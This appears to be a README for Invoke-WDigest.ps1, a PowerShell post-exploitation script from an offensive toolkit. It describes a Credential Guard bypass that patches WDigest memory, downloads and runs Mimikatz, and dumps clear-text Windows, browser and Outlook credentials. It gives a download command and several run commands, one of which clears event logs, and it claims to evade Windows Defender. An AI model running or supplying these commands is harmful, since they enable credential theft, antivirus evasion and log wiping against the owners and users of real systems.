## Invoke-WDigest.ps1

|Script Name|Description|Privileges|Credits|
|---|---|---|---|
|[Invoke-WDigest](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/Invoke-WDigest.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|@wh0nsq, @Benjamin_Delpy, @nirsoft|

<br /><br />

|Parameter|Description|Defaul value|
|---|---|---|
|WDigest|Activate WDigest credential caching in Memory?|<b><i>true</i></b>|
|ManyCats|Switch that downloads\executes Mimikatz to dump credentials *|<b><i>false</i></b>|
|RunAs|Switch that prompts user for credential input and store it in memory|<b><i>false</i></b>|
|DcName|Switch of RunAs command that accepts USER@DOMAIN or DOMAIN\USER<br />Remark: this function requires <b><i>-RunAs</i></b> parameter switch declaration|<b><i>$Env:COMPUTERNAME\\$Env:USERNAME</i></b>|
|Module|Mimikatz selection of dump::modules to auto-run|<b><i>sekurlsa::wdigest exit</i></b>|
|BrowserCreds|Dump installed browers\outlook credentials [clear-text]|<b><i>false</i></b>|
|Banner|Print Invoke-WDigest cmdlet banner?|true|

<b><i>* Invoke-WDigest.ps1 cmdlet only bypasses mimikatz detection if windows defender its the only AV running in target system.</i></b><br />

<br /><br />

**download Invoke-WDigest.ps1:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
```

<br />

**run cmdlet:**
```powershell
# Cmdlet help
Get-Help .\Invoke-WDigest.ps1 -full

# Execute Mimikatz (interactive shell) without WDigest caching
.\Invoke-WDigest.ps1 -wdigest 'false' -manycats

#  Ativate WDigest caching + Execute Mimikatz 'sekurlsa::wdigest exit'
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats

# Ativate WDigest caching + Execute Mimikatz 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump modules.
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi'

# Execute Mimikatz (multiple dump::modules) without WDigest caching
.\Invoke-WDigest.ps1 -wdigest 'false' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::dpapi event::clear exit'

#  Ativate WDigest caching + Exec Mimikatz pre-sellection of dump::modules
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'auto'

# Dump browsers credentials without WDiget catching
.\Invoke-WDigest.ps1 -wdigest 'false' -browsercreds



[WDIGEST MEMORY CATCHING - FAST DEMONSTRATION]

## WDigest caching + dump (-runas) created credential with mimikatz
.\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas

WORKFLOW
   - Invoke-WDigest.ps1 Ativates WDigest caching in memory
   - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
     - [Downside] -runas switch pauses cmdlet execution waiting for credential input.
   - WDigest will store (runas) credential input by user in clear-text in memory
     - [Downside] -runas command (wdigest) only stores 'valid' credentials in-memory.   
   - mimikatz will auto-execute 'mimikatz sekurlsa::wdigest exit' to dump credentials

REMARK
   RunAs parameter switch pauses this cmdlet execution until one credential its inputed,
   then starts cmd.exe with suplied credential in a hidden windows (detach from parent).
   Child process its necessary for mimikatz 'sekurlsa::wdigest' dump the cred from Memory.
```

<br />

<b><i>Execute Mimikatz (interactive shell) without WDigest caching</i></b><br />
![interactive](https://user-images.githubusercontent.com/23490060/219967042-4559b463-5e3e-470d-8ffe-5111eae7f015.png)

<br />

<b><i>WDigest caching + dump (-runas) created credential with mimikatz</i></b><br />
![POC2](https://user-images.githubusercontent.com/23490060/219876558-6f68d5cb-e0b7-4bd2-b6e1-689dd8f62792.png)

![POC3](https://user-images.githubusercontent.com/23490060/219876572-e28d1c22-b6a6-456c-a710-2af8e75f339b.png)

<br />

<b><i>Dump browsers credentials without WDiget catching</i></b><br />
![brcreds](https://user-images.githubusercontent.com/23490060/221413695-a227e1c3-fa2d-43e0-9f50-44b0157a5af0.png)<br />
![outlook](https://user-images.githubusercontent.com/23490060/221729426-e7363d4b-fef1-4155-9383-06bbe1479f00.png)


<br />

<b><i>Invoke-WDigest.ps1 only bypasses mimikatz detection if windows defender its the only AV running in target system</i></b><br />
![ProactiveDefense](https://user-images.githubusercontent.com/23490060/219057639-902cc82a-43a3-4391-9927-4b55e532a78c.png)


<br />

- [Mimikatz modules list](https://tools.thehacker.recipes/mimikatz/modules)
